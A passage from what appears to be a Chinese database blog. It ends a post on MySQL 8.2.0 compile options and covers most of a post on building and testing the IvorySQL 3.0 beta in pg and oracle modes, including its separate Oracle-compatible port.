<p>例如：<a href="https://shawnyan.cn/2023/postgresql/pg-16-run-on-centos-7/">【PG16】后 RHEL 7 时代, PG 16 如何在 CentOS 7 上运行</a></p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">psql</span></span><br><span class="line">psql (16.0-ShawnYan)</span><br></pre></td></tr></table></figure></div>
<p>在 MySQL 中，也同样可以加入定制版本信息，只需在编译时加入选项 <code>MYSQL_SERVER_SUFFIX</code> 即可。</p>
<p>实际效果如下：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rocky9 bin]# ./mysql -uroot</span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 9</span><br><span class="line">Server version: 8.2.0-ShawnYan-debug Source distribution</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2023, Oracle and/or its affiliates.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash"><span class="keyword">select</span> version();</span></span><br><span class="line">+----------------------+</span><br><span class="line">| version()            |</span><br><span class="line">+----------------------+</span><br><span class="line">| 8.2.0-ShawnYan-debug |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2023/mysql/mysql-8.2.0-compile-customization/img2-8.2.0-ShawnYan-debug.png"
                      alt="" loading="lazy"
                ></p>
<h2 id="总结">总结</h2>
<p>到此，MySQL 8.2.0 编译选项就先介绍到这里，在实际的测试或者生产环境中，可以依据实际项目需求，来增加、减少存储引擎或插件，当然，ALL IN ONE 也不是不可。</p>
<p>In short，本文介绍了 MySQL 的常见存储引擎，MySQL X 协议，和 Router，并提供了编译选项以供参考。</p>
<img  alt="logo.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240222-e133c9a2-37fa-47e9-9f67-d49bfdc02bdf.jpg"
                      referrerpolicy="no-referrer"
                ><hr class="footnotes-sep">
<section class="footnotes">
<ol class="footnotes-list">
<li id="fn1" class="footnote-item"><p><a class="link"   href="https://dev.mysql.com/doc/refman/8.2/en/archive-storage-engine.html" >https://dev.mysql.com/doc/refman/8.2/en/archive-storage-engine.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref1" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn2" class="footnote-item"><p><a class="link"   href="https://dev.mysql.com/doc/refman/8.2/en/mysql-cluster-overview.html" >https://dev.mysql.com/doc/refman/8.2/en/mysql-cluster-overview.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref2" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn3" class="footnote-item"><p><a class="link"   href="https://dev.mysql.com/doc/refman/8.0/en/mysql-innodb-cluster-introduction.html" >https://dev.mysql.com/doc/refman/8.0/en/mysql-innodb-cluster-introduction.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref3" class="footnote-backref">↩︎</a> <a href="#fnref3:1" class="footnote-backref">↩︎</a></p>
</li>
</ol>
</section>
]]></content>
      <categories>
        <category>MySQL</category>
        <category>MySQL 8.x</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>compile</tag>
        <tag>rocky</tag>
        <tag>mysql 8.2</tag>
        <tag>engine</tag>
      </tags>
  </entry>
  <entry>
    <title>IvorySQL v3.0 新特性浅测</title>
    <url>/2023/postgresql/ivorysql-v3.0-feature/</url>
    <content><![CDATA[<img  alt="ivorysql-logo.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220419-f0ca4139-24ab-4ec2-b9c4-02b613d5b6ea.jpg"
                      referrerpolicy="no-referrer"
                >
<!--
@[toc](目录)
-->
<h2 id="目录">目录</h2>
<pre><code>    IvorySQL 3.0 编译安装
        操作系统
        克隆源码
        编译 IvorySQL 3
    初始化 PG 模式 `initdb -m pg`
    初始化 Oracle 模式 `initdb -m oracle`
    IvorySQL 3 支持双端口号
    总结
    参考
</code></pre>
<hr>
<p>本文写在 IvorySQL 3.0 发版前夕，在 IvorySQL 正式 GA 前，先来一探 IvorySQL 3.0 的几个新特性。</p>
<h2 id="IvorySQL-3-0-编译安装">IvorySQL 3.0 编译安装</h2>
<p>之前介绍过 IvorySQL 2 的编译安装，但 3.0 是大版本变更，安装过程与之前还是有些许区别，需要注意。</p>
<h3 id="操作系统">操作系统</h3>
<p>操作系统信息：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 ~]$ cat /etc/redhat-release</span><br><span class="line">Rocky Linux release 9.2 (Blue Onyx)</span><br><span class="line">[shawnyan@rocky9 ~]$ uname -a</span><br><span class="line">Linux rocky9.shawnyan.cn 5.14.0-284.30.1.el9_2.x86_64 #1 SMP PREEMPT_DYNAMIC Sat Sep 16 09:55:41 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line">[shawnyan@rocky9 ~]$ date</span><br><span class="line">Tue Oct 31 10:12:29 PM CST 2023</span><br></pre></td></tr></table></figure></div>
<p>本文使用的编译环境为 Rocky Linux 9.2 操作系统，关于如何安装该系统，可参考：</p>
<ul>
<li><a href="https://shawnyan.cn/2023/linux/rocky-9.2-install/">Step by Step 安装 Rocky Linux 9.2 系统</a></li>
</ul>
<h3 id="克隆源码">克隆源码</h3>
<p>这里提示两种下载源码方式，一是直接用 git 进行克隆，可以获取到最新版的代码，及提交记录，二是直接下载打包好的源码。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/IvorySQL/IvorySQL.git -b IVORY_REL_3_STABLE --depth=1</span><br></pre></td></tr></table></figure></div>
<ul>
<li>查看源码版本</li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rocky9 IvorySQL]# git lg</span><br><span class="line">* a14ca56 - (grafted, HEAD -&gt; IVORY_REL_3_STABLE, tag: Ivorysql_3.0_Beta, origin/IVORY_REL_3_STABLE) IvorySQL:Modify version information. (12 days ago) &lt;wangjie&gt;</span><br></pre></td></tr></table></figure></div>
<ul>
<li>或者直接下载源码包</li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://github.com/IvorySQL/IvorySQL/archive/refs/tags/Ivorysql_3.0_Beta.zip</span><br></pre></td></tr></table></figure></div>
<h3 id="编译-IvorySQL-3">编译 IvorySQL 3</h3>
<p>进入代码目录，进行编译配置，这里需要注意的是，如果本地环境没有安装 ICU 类库，则会报错，所以可以在编译选项中排除编译 ICU 。</p>
<ul>
<li>编译配置项</li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">./configure --prefix=/opt/ivorysql --with-extra-version=&quot;-ShawnYan&quot; \</span><br><span class="line">--without-icu</span><br></pre></td></tr></table></figure></div>
<ul>
<li>输出日志：</li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">configure: using compiler=gcc (GCC) 11.3.1 20221121 (Red Hat 11.3.1-4)</span><br><span class="line">configure: using CFLAGS=-Wall -Wmissing-prototypes -Wpointer-arith -Wdeclaration-after-statement -Werror=vla -Wendif-labels -Wmissing-format-attribute -Wimplicit-fallthrough=3 -Wcast-function-type -Wshadow=compatible-local -Wformat-security -fno-strict-aliasing -fwrapv -fexcess-precision=standard -Wno-format-truncation -Wno-stringop-truncation -O2</span><br><span class="line">configure: using CPPFLAGS= -D_GNU_SOURCE</span><br><span class="line">configure: using LDFLAGS=  -Wl,--as-needed</span><br><span class="line">configure: creating ./config.status</span><br><span class="line">config.status: creating GNUmakefile</span><br><span class="line">config.status: creating src/Makefile.global</span><br><span class="line">config.status: creating src/include/pg_config.h</span><br><span class="line">config.status: creating src/include/pg_config_ext.h</span><br><span class="line">config.status: creating src/interfaces/ecpg/include/ecpg_config.h</span><br><span class="line">config.status: linking src/backend/port/tas/dummy.s to src/backend/port/tas.s</span><br><span class="line">config.status: linking src/backend/port/posix_sema.c to src/backend/port/pg_sema.c</span><br><span class="line">config.status: linking src/backend/port/sysv_shmem.c to src/backend/port/pg_shmem.c</span><br><span class="line">config.status: linking src/include/port/linux.h to src/include/pg_config_os.h</span><br><span class="line">config.status: linking src/makefiles/Makefile.linux to src/Makefile.port</span><br><span class="line">[root@rocky9 IvorySQL-Ivorysql_3.0_Beta]#</span><br></pre></td></tr></table></figure></div>
<ul>
<li>ICU 报错</li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">checking for icu-uc icu-i18n... no</span><br><span class="line">configure: error: ICU library not found</span><br><span class="line">If you have ICU already installed, see config.log for details on the</span><br><span class="line">failure.  It is possible the compiler isn&#x27;t looking in the proper directory.</span><br><span class="line">Use --without-icu to disable ICU support.</span><br></pre></td></tr></table></figure></div>
<blockquote>
<p>笔者案：这里是个优化点。</p>
</blockquote>
<ul>
<li>make 编译</li>
</ul>
<p>虽然 Ivory 3 增加了新的编译方式，可以用 <code>meson</code> 进行编译，但本文使用的方式依旧是传统的 <code>make</code>。</p>
<p>但是，在编译过程中遇到如下报错：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">Can&#x27;t locate FindBin.pm in @INC (you may need to install the FindBin module) (@INC contains: /usr/local/lib64/perl5/5.32 /usr/local/share/perl5/5.32 /usr/lib64/perl5/vendor_perl /usr/share/perl5/vendor_perl /usr/lib64/perl5 /usr/share/perl5) at genbki.pl line 20.</span><br><span class="line">BEGIN failed--compilation aborted at genbki.pl line 20.</span><br><span class="line">make[2]: *** [Makefile:109: bki-stamp] Error 2</span><br><span class="line">make[2]: Leaving directory &#x27;/data/IvorySQL-Ivorysql_3.0_Beta/src/backend/catalog&#x27;</span><br><span class="line">make[1]: *** [Makefile:138: submake-catalog-headers] Error 2</span><br><span class="line">make[1]: Leaving directory &#x27;/data/IvorySQL-Ivorysql_3.0_Beta/src/backend&#x27;</span><br><span class="line">make: *** [src/Makefile.global:393: submake-generated-headers] Error 2</span><br></pre></td></tr></table></figure></div>
<p>提示缺少依赖 <code>perl-FindBin</code>，安装后再次编译，通过。</p>
<blockquote>
<p>笔者案：这里是个优化点。</p>
</blockquote>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">make[1]: Leaving directory &#x27;/data/IvorySQL-Ivorysql_3.0_Beta/contrib/ora_btree_gist&#x27;</span><br><span class="line">make -C contrib/ora_btree_gin all</span><br><span class="line">make[1]: Entering directory &#x27;/data/IvorySQL-Ivorysql_3.0_Beta/contrib/ora_btree_gin&#x27;</span><br><span class="line">gcc -Wall -Wmissing-prototypes -Wpointer-arith -Wdeclaration-after-statement -Werror=vla -Wendif-labels -Wmissing-format-attribute -Wimplicit-fallthrough=3 -Wcast-function-type -Wshadow=compatible-local -Wformat-security -fno-strict-aliasing -fwrapv -fexcess-precision=standard -Wno-format-truncation -Wno-stringop-truncation -O2 -fPIC -fvisibility=hidden -I. -I. -I../../src/include  -D_GNU_SOURCE   -c -o ora_btree_gin.o ora_btree_gin.c</span><br><span class="line">gcc -Wall -Wmissing-prototypes -Wpointer-arith -Wdeclaration-after-statement -Werror=vla -Wendif-labels -Wmissing-format-attribute -Wimplicit-fallthrough=3 -Wcast-function-type -Wshadow=compatible-local -Wformat-security -fno-strict-aliasing -fwrapv -fexcess-precision=standard -Wno-format-truncation -Wno-stringop-truncation -O2 -fPIC -fvisibility=hidden -shared -o ora_btree_gin.so  ora_btree_gin.o -L../../src/port -L../../src/common    -Wl,--as-needed -Wl,-rpath,&#x27;/opt/ivorysql/lib&#x27;,--enable-new-dtags -fvisibility=hidden</span><br><span class="line">make[1]: Leaving directory &#x27;/data/IvorySQL-Ivorysql_3.0_Beta/contrib/ora_btree_gin&#x27;</span><br><span class="line">[root@rocky9 IvorySQL-Ivorysql_3.0_Beta]#</span><br></pre></td></tr></table></figure></div>
<p>编译完成后，进行安装。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 IvorySQL-Ivorysql_3.0_Beta]$ sudo make install</span><br><span class="line">make -C ./src/backend generated-headers</span><br><span class="line">make[1]: Entering directory &#x27;/data/IvorySQL-Ivorysql_3.0_Beta/src/backend&#x27;</span><br><span class="line">make -C catalog distprep generated-header-symlinks</span><br><span class="line">make[2]: Entering directory &#x27;/data/IvorySQL-Ivorysql_3.0_Beta/src/backend/catalog&#x27;</span><br><span class="line">...</span><br><span class="line">make[1]: Entering directory &#x27;/data/IvorySQL-Ivorysql_3.0_Beta/contrib/ora_btree_gin&#x27;</span><br><span class="line">/bin/mkdir -p &#x27;/opt/ivorysql/lib/postgresql&#x27;</span><br><span class="line">/bin/mkdir -p &#x27;/opt/ivorysql/share/postgresql/extension&#x27;</span><br><span class="line">/bin/mkdir -p &#x27;/opt/ivorysql/share/postgresql/extension&#x27;</span><br><span class="line">/bin/install -c -m 755  ora_btree_gin.so &#x27;/opt/ivorysql/lib/postgresql/ora_btree_gin.so&#x27;</span><br><span class="line">/bin/install -c -m 644 ./ora_btree_gin.control &#x27;/opt/ivorysql/share/postgresql/extension/&#x27;</span><br><span class="line">/bin/install -c -m 644 ./ora_btree_gin--1.0.sql  &#x27;/opt/ivorysql/share/postgresql/extension/&#x27;</span><br><span class="line">make[1]: Leaving directory &#x27;/data/IvorySQL-Ivorysql_3.0_Beta/contrib/ora_btree_gin&#x27;</span><br><span class="line">[shawnyan@rocky9 IvorySQL-Ivorysql_3.0_Beta]$</span><br></pre></td></tr></table></figure></div>
<p>接下来，初始化数据目录后，便可启动 IvorySQL 3。</p>
<h2 id="初始化-PG-模式-initdb-m-pg">初始化 PG 模式 <code>initdb -m pg</code></h2>
<p>从 IvorySQL 3 开始，IvorySQL 兼容 Oracle 的方式不再通过插件形式兼容，而是直接固化到源码中。<br>
在 IvorySQL 初始化时，可以指定是 pg 模式，还是 oracle 模式，默认为 oracle 模式。</p>
<p>只是，在初始化的时候找了好久不知道可以传什么参数，试了 <code>postgres</code>/<code>postgresql</code> 都不行，原来只需要简单的 <code>pg</code> 二字。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[ivorysql@rocky9 ~]$ initdb -? | grep &quot;dbmode&quot;</span><br><span class="line">  -m, --dbmode=MODE 	    set database mode, default is oracle</span><br></pre></td></tr></table></figure></div>
<blockquote>
<p>笔者案：这里是个优化点。</p>
</blockquote>
<p>这里先指定 pg 模式，来看看熟悉的一面。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[ivorysql@rocky9 ~]$ initdb -m pg</span><br><span class="line">The files belonging to this database system will be owned by user &quot;ivorysql&quot;.</span><br><span class="line">This user must also own the server process.</span><br><span class="line"></span><br><span class="line">The database cluster will be initialized with locale &quot;en_US.UTF-8&quot;.</span><br><span class="line">The default database encoding has accordingly been set to &quot;UTF8&quot;.</span><br><span class="line">The default text search configuration will be set to &quot;english&quot;.</span><br><span class="line"></span><br><span class="line">Data page checksums are disabled.</span><br><span class="line"></span><br><span class="line">fixing permissions on existing directory /var/lib/ivorysql/3/data ... ok</span><br><span class="line">creating subdirectories ... ok</span><br><span class="line">selecting dynamic shared memory implementation ... posix</span><br><span class="line">selecting default max_connections ... 100</span><br><span class="line">selecting default shared_buffers ... 128MB</span><br><span class="line">selecting default time zone ... Asia/Shanghai</span><br><span class="line">creating configuration files ... ok</span><br><span class="line">running bootstrap script ... ok</span><br><span class="line">performing post-bootstrap initialization ... ok</span><br><span class="line">syncing data to disk ... ok</span><br><span class="line"></span><br><span class="line">initdb: warning: enabling &quot;trust&quot; authentication for local connections</span><br><span class="line">initdb: hint: You can change this by editing pg_hba.conf or using the option -A, or --auth-local and --auth-host, the next time you run initdb.</span><br><span class="line"></span><br><span class="line">Success. You can now start the database server using:</span><br><span class="line"></span><br><span class="line">    pg_ctl -D /var/lib/ivorysql/3/data -l logfile start</span><br><span class="line"></span><br><span class="line">[ivorysql@rocky9 ~]$ pg_ctl -D /var/lib/ivorysql/3/data -l logfile start</span><br><span class="line">waiting for server to start.... done</span><br><span class="line">server started</span><br></pre></td></tr></table></figure></div>
<p>启动服务后，连接数据库，发现找不到 ivorysql 这个数据库，经确认，该库在 ivory 3 中已被移除。</p>
<p>为了便于测试，这里先手动创建一个名为 <code>ivorysql</code> 的数据库，然后再次连接。</p>
<ul>
<li>查看版本号</li>
</ul>
<img  alt="01-version.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231031-8b8078ba-7631-42b5-8c20-867cc04ee3d5.png"
                      referrerpolicy="no-referrer"
                >
<p>可以看到 IvorySQL 3.0 BETA 版，基于 PostgreSQL 16.0，版本号中加了我的签名。</p>
<ul>
<li>查看 ivorysql 相关设定</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">ivorysql<span class="operator">=</span># <span class="keyword">select</span> name,setting,short_desc <span class="keyword">from</span> pg_settings <span class="keyword">where</span> name <span class="keyword">like</span> <span class="string">&#x27;%ivory%&#x27;</span>;</span><br><span class="line">                name                 <span class="operator">|</span>   setting   <span class="operator">|</span>                              short_desc                              </span><br><span class="line"><span class="comment">-------------------------------------+-------------+----------------------------------------------------------------------</span></span><br><span class="line"> ivorysql.compatible_mode            <span class="operator">|</span> pg          <span class="operator">|</span> <span class="keyword">Set</span> <span class="keyword">default</span> <span class="keyword">sql</span> parser compatibility mode</span><br><span class="line"> ivorysql.database_mode              <span class="operator">|</span> pg          <span class="operator">|</span> <span class="keyword">Set</span> database mode</span><br><span class="line"> ivorysql.datetime_ignore_nls_mask   <span class="operator">|</span> <span class="number">0</span>           <span class="operator">|</span> Sets the datetime type input <span class="keyword">is</span> <span class="keyword">not</span> controlled <span class="keyword">by</span> the NLS parameter.</span><br><span class="line"> ivorysql.enable_emptystring_to_NULL <span class="operator">|</span> off         <span class="operator">|</span> whether <span class="keyword">convert</span> <span class="keyword">empty</span> string <span class="keyword">to</span> NULL.</span><br><span class="line"> ivorysql.identifier_case_switch     <span class="operator">|</span> interchange <span class="operator">|</span> <span class="keyword">Set</span> <span class="type">character</span> <span class="keyword">case</span> conversion mode.</span><br><span class="line"> ivorysql.listen_addresses           <span class="operator">|</span> localhost   <span class="operator">|</span> Sets oracle host name <span class="keyword">or</span> IP address(es) <span class="keyword">to</span> listen to.</span><br><span class="line"> ivorysql.port                       <span class="operator">|</span> <span class="number">1521</span>        <span class="operator">|</span> Sets the Oracle TCP port the server listens on.</span><br><span class="line">(<span class="number">7</span> <span class="keyword">rows</span>)</span><br></pre></td></tr></table></figure></div>
<img  alt="02-settings.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231031-4b492fce-072b-490a-9d4b-4df482b739f2.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="初始化-Oracle-模式-initdb-m-oracle">初始化 Oracle 模式 <code>initdb -m oracle</code></h2>
<p>由于 Ivory 3 中，初始化默认选择 oracle 模式，所以 <code>-m oracle</code> 和不加 <code>-m</code> 参数是等价的。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[ivorysql@rocky9 3]$ initdb -m oracle</span><br><span class="line">The files belonging to this database system will be owned by user &quot;ivorysql&quot;.</span><br><span class="line">This user must also own the server process.</span><br><span class="line"></span><br><span class="line">The database cluster will be initialized with locale &quot;en_US.UTF-8&quot;.</span><br><span class="line">The default database encoding has accordingly been set to &quot;UTF8&quot;.</span><br><span class="line">The default text search configuration will be set to &quot;english&quot;.</span><br><span class="line"></span><br><span class="line">Data page checksums are disabled.</span><br><span class="line"></span><br><span class="line">fixing permissions on existing directory /var/lib/ivorysql/3/data ... ok</span><br><span class="line">creating subdirectories ... ok</span><br><span class="line">selecting dynamic shared memory implementation ... posix</span><br><span class="line">selecting default max_connections ... 100</span><br><span class="line">selecting default shared_buffers ... 128MB</span><br><span class="line">selecting default time zone ... Asia/Shanghai</span><br><span class="line">creating configuration files ... ok</span><br><span class="line">running bootstrap script ... ok</span><br><span class="line">performing post-bootstrap initialization ... ok</span><br><span class="line">syncing data to disk ... ok</span><br><span class="line"></span><br><span class="line">initdb: warning: enabling &quot;trust&quot; authentication for local connections</span><br><span class="line">initdb: hint: You can change this by editing pg_hba.conf or using the option -A, or --auth-local and --auth-host, the next time you run initdb.</span><br><span class="line"></span><br><span class="line">Success. You can now start the database server using:</span><br><span class="line"></span><br><span class="line">    pg_ctl -D /var/lib/ivorysql/3/data -l logfile start</span><br><span class="line"></span><br><span class="line">[ivorysql@rocky9 3]$ </span><br></pre></td></tr></table></figure></div>
<ul>
<li>启动 Oracle 模式下的 IvorySQL 3</li>
</ul>
<p>启动后，再次查询设定，可以看到，数据库模式变成了 oracle，但当前兼容模式是 pg。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">ivorysql<span class="operator">=</span># <span class="keyword">select</span> name,setting,short_desc <span class="keyword">from</span> pg_settings <span class="keyword">where</span> name <span class="keyword">like</span> <span class="string">&#x27;%ivory%&#x27;</span>;</span><br><span class="line">                name                 <span class="operator">|</span>   setting   <span class="operator">|</span>                              short_desc                              </span><br><span class="line"><span class="comment">-------------------------------------+-------------+----------------------------------------------------------------------</span></span><br><span class="line"> ivorysql.compatible_mode            <span class="operator">|</span> pg          <span class="operator">|</span> <span class="keyword">Set</span> <span class="keyword">default</span> <span class="keyword">sql</span> parser compatibility mode</span><br><span class="line"> ivorysql.database_mode              <span class="operator">|</span> oracle      <span class="operator">|</span> <span class="keyword">Set</span> database mode</span><br><span class="line"> ivorysql.datetime_ignore_nls_mask   <span class="operator">|</span> <span class="number">0</span>           <span class="operator">|</span> Sets the datetime type input <span class="keyword">is</span> <span class="keyword">not</span> controlled <span class="keyword">by</span> the NLS parameter.</span><br><span class="line"> ivorysql.enable_emptystring_to_NULL <span class="operator">|</span> <span class="keyword">on</span>          <span class="operator">|</span> whether <span class="keyword">convert</span> <span class="keyword">empty</span> string <span class="keyword">to</span> NULL.</span><br><span class="line"> ivorysql.identifier_case_switch     <span class="operator">|</span> interchange <span class="operator">|</span> <span class="keyword">Set</span> <span class="type">character</span> <span class="keyword">case</span> conversion mode.</span><br><span class="line"> ivorysql.listen_addresses           <span class="operator">|</span> localhost   <span class="operator">|</span> Sets oracle host name <span class="keyword">or</span> IP address(es) <span class="keyword">to</span> listen to.</span><br><span class="line"> ivorysql.port                       <span class="operator">|</span> <span class="number">1521</span>        <span class="operator">|</span> Sets the Oracle TCP port the server listens on.</span><br><span class="line">(<span class="number">7</span> <span class="keyword">rows</span>)</span><br></pre></td></tr></table></figure></div>
<img  alt="03-psql.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231031-c35bfcac-7723-4047-bf3b-e876fb67a997.png"
                      referrerpolicy="no-referrer"
                >
<p>此时，创建 <code>varchar2</code> 字段类型的表会报错。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">odb<span class="operator">=</span># <span class="keyword">create</span> <span class="keyword">table</span> t(id <span class="type">int</span>, name varchar2(<span class="number">10</span>));</span><br><span class="line"><span class="number">2023</span><span class="number">-10</span><span class="number">-31</span> <span class="number">22</span>:<span class="number">23</span>:<span class="number">41.196</span> CST [<span class="number">84392</span>] ERROR:  type &quot;varchar2&quot; does <span class="keyword">not</span> exist <span class="keyword">at</span> <span class="type">character</span> <span class="number">29</span></span><br><span class="line"><span class="number">2023</span><span class="number">-10</span><span class="number">-31</span> <span class="number">22</span>:<span class="number">23</span>:<span class="number">41.196</span> CST [<span class="number">84392</span>] STATEMENT:  <span class="keyword">create</span> <span class="keyword">table</span> t(id <span class="type">int</span>, name varchar2(<span class="number">10</span>));</span><br><span class="line">ERROR:  type &quot;varchar2&quot; does <span class="keyword">not</span> exist</span><br><span class="line">LINE <span class="number">1</span>: <span class="keyword">create</span> <span class="keyword">table</span> t(id <span class="type">int</span>, name varchar2(<span class="number">10</span>));</span><br><span class="line">                                    <span class="operator">^</span></span><br></pre></td></tr></table></figure></div>
<p>这是因为 psql 默认从端口 5432 进入，如果想使用 IvorySQL 的 Oracle 模式，需要从端口 1521 进入。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">[ivorysql<span class="variable">@rocky9</span> <span class="number">3</span>]$ psql <span class="operator">-</span>p1521</span><br><span class="line">psql (<span class="number">16.0</span><span class="operator">-</span>ShawnYan)</span><br><span class="line">Type &quot;help&quot; <span class="keyword">for</span> help.</span><br><span class="line"></span><br><span class="line">ivorysql<span class="operator">=</span># <span class="keyword">select</span> name,setting,short_desc <span class="keyword">from</span> pg_settings <span class="keyword">where</span> name <span class="keyword">like</span> <span class="string">&#x27;%ivory%&#x27;</span>;</span><br><span class="line">                name                 <span class="operator">|</span>   setting   <span class="operator">|</span>                              short_desc                              </span><br><span class="line"><span class="comment">-------------------------------------+-------------+----------------------------------------------------------------------</span></span><br><span class="line"> ivorysql.compatible_mode            <span class="operator">|</span> oracle      <span class="operator">|</span> <span class="keyword">Set</span> <span class="keyword">default</span> <span class="keyword">sql</span> parser compatibility mode</span><br><span class="line"> ivorysql.database_mode              <span class="operator">|</span> oracle      <span class="operator">|</span> <span class="keyword">Set</span> database mode</span><br><span class="line"> ivorysql.datetime_ignore_nls_mask   <span class="operator">|</span> <span class="number">0</span>           <span class="operator">|</span> Sets the datetime type input <span class="keyword">is</span> <span class="keyword">not</span> controlled <span class="keyword">by</span> the NLS parameter.</span><br><span class="line"> ivorysql.enable_emptystring_to_NULL <span class="operator">|</span> <span class="keyword">on</span>          <span class="operator">|</span> whether <span class="keyword">convert</span> <span class="keyword">empty</span> string <span class="keyword">to</span> NULL.</span><br><span class="line"> ivorysql.identifier_case_switch     <span class="operator">|</span> interchange <span class="operator">|</span> <span class="keyword">Set</span> <span class="type">character</span> <span class="keyword">case</span> conversion mode.</span><br><span class="line"> ivorysql.listen_addresses           <span class="operator">|</span> localhost   <span class="operator">|</span> Sets oracle host name <span class="keyword">or</span> IP address(es) <span class="keyword">to</span> listen to.</span><br><span class="line"> ivorysql.port                       <span class="operator">|</span> <span class="number">1521</span>        <span class="operator">|</span> Sets the Oracle TCP port the server listens on.</span><br><span class="line">(<span class="number">7</span> <span class="keyword">rows</span>)</span><br></pre></td></tr></table></figure></div>
<p>再次创建测试表，成功。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">odb<span class="operator">=</span># <span class="keyword">create</span> <span class="keyword">table</span> t(id <span class="type">int</span>, name varchar2(<span class="number">10</span>));</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span></span><br><span class="line">odb<span class="operator">=</span># \d t</span><br><span class="line">                     <span class="keyword">Table</span> &quot;public.t&quot;</span><br><span class="line"> <span class="keyword">Column</span> <span class="operator">|</span>      Type       <span class="operator">|</span> <span class="keyword">Collation</span> <span class="operator">|</span> Nullable <span class="operator">|</span> <span class="keyword">Default</span> </span><br><span class="line"><span class="comment">--------+-----------------+-----------+----------+---------</span></span><br><span class="line"> id     <span class="operator">|</span> pg_catalog.int4 <span class="operator">|</span>           <span class="operator">|</span>          <span class="operator">|</span> </span><br><span class="line"> name   <span class="operator">|</span> varchar2(<span class="number">10</span>)    <span class="operator">|</span>           <span class="operator">|</span>          <span class="operator">|</span> </span><br><span class="line"></span><br><span class="line">odb<span class="operator">=</span># </span><br></pre></td></tr></table></figure></div>
<h2 id="IvorySQL-3-支持双端口号">IvorySQL 3 支持双端口号</h2>
<p>上文已经描述了 pg/oracle 两种模式，而且端口号不同，再次从 OS 层面进行验证。</p>
